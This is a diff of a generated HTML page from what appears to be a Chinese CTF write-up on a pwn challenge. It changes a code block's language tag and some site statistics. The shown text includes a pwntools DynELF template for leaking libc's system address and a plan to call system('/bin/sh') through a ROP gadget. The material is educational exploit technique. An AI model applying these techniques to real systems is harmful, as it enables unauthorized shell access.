@@ -470,7 +470,7 @@
 
       
         <p>该题用到了 DynELF 技术  </p>
-<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">p = process(<span class="string">'./xxx'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span></span>:</div><div class="line">  <span class="comment">#各种预处理</span></div><div class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></div><div class="line">  p.send(payload)</div><div class="line">  <span class="comment">#各种处理</span></div><div class="line">  data = p.recv(<span class="number">4</span>)</div><div class="line">  <span class="keyword">return</span> data</div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></div><div class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></div></pre></td></tr></table></figure></p>
+<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">p = process(<span class="string">'./xxx'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">  <span class="comment">#各种预处理</span></div><div class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></div><div class="line">  p.send(payload)</div><div class="line">  <span class="comment">#各种处理</span></div><div class="line">  data = p.recv(<span class="number">4</span>)</div><div class="line">  <span class="keyword">return</span> data</div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></div><div class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></div></pre></td></tr></table></figure></p>
 <p>再看read 函数：<br>定义函数：ssize_t read(int fd, void * buf, size_t count);<br>函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中.  若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.  </p>
 <p>思路：<br>1.调用main函数循环利用<br>2.泄露出system地址<br>3.写入”/bin/sh”<br>4.调用system获取shell，在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress。保证堆栈平衡</p>
 <p>查找gadget：<br><code>ROPgadget --binary pwn200 --only &quot;pop|ret&quot;</code><br>使用：<br><code>0x08048649 : pop esi ; pop edi ; pop ebp ; ret</code>   </p>
@@ -595,7 +595,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">62</span>
+                    <span class="site-state-item-count">66</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -748,7 +748,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="Symbols count total">82k</span>
+    <span title="Symbols count total">88k</span>
   
 
   
@@ -757,7 +757,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="Reading time total">1:14</span>
+    <span title="Reading time total">1:20</span>
   
 </div>
 
